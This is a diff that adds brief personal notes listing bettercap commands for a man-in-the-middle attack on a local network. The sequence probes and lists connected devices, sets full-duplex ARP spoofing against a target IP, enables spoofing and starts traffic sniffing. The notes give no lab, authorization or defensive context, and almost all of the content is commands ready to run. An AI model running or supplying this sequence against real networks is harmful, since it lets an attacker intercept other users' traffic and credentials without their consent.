@@ -1,0 +1,22 @@
+bettercap
+
+help
+
+help net.probe
+
+net.probe on
+
+net.show - what actually happen is the module scanning all the devices connected to the same network as our pc, including it’s ip address, mac address and vendor’s name. To make things clearer we can type net.show for further information.
+
+help arp.spoof - 
+
+netdiscover - use net discover to display devices connected to your network.
+
+set arp.spoof.duplex true
+
+set arp.spoof.targets
+ <target ip>
+
+arp.spoof on
+
+net.sniff on
